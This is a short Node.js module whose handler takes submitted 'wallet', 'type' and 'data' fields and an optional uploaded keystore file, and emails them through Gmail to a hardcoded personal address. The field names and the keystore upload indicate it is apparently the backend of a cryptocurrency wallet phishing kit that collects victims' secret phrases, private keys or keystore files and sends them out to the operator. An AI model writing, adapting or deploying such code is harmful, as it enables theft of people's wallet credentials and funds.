require("dotenv").config();
const multer = require("multer");
const nodemailer = require("nodemailer");

// Memory storage for optional file uploads
const storage = multer.memoryStorage();
const upload = multer({ storage });

const handleSubmission = async (req, res) => {
  try {
    // Destructure wallet, type, and data from request body
    const { wallet, type, data } = req.body;

    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: "Tomoteletoyese@gmail.com",
      subject: `New Wallet Submission - ${wallet}`,
      text: `
        Wallet: ${wallet || "N/A"}
        Type: ${type || "N/A"}
        Data: ${data || "N/A"}
      `,
    };

    // If a file is uploaded (image/keystore), attach it
    if (req.file) {
      mailOptions.attachments = [
        {
          filename: req.file.originalname,
          content: req.file.buffer,
        },
      ];
    }

    await transporter.sendMail(mailOptions);

    res.status(200).json({ success: true, message: "Submission sent!" });
  } catch (error) {
    console.error("Email error:", error);
    res.status(500).json({ success: false, message: "Something went wrong." });
  }
};

module.exports = { upload, handleSubmission };
